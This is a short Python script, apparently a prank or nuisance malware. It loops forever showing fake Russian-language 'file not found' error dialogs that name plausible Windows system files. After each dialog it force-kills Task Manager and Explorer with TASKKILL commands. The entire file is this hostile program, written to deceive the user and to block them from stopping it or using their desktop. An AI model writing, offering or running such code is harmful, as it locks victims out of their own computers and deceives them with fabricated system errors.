from tkinter import *
from tkinter import messagebox
from random import randint
import os

def ErrorSpamer():
    files = ["system.tmp","bak.lock","win.sys","cmd.exe","win.dll","Amcache.hve","RecentFileCache.bcf","APPRAISER_TelemetryBaseline_19H1.bin"]
    messagebox.showerror(title="Ошибка",message="Файл {} не найден".format(files[randint(0,7)]))

if __name__ == "__main__":
    while True:
        ErrorSpamer()
        os.system("TASKKILL /F /IM taskmgr.exe")
        os.system("TASKKILL /F /IM explorer.exe")
        

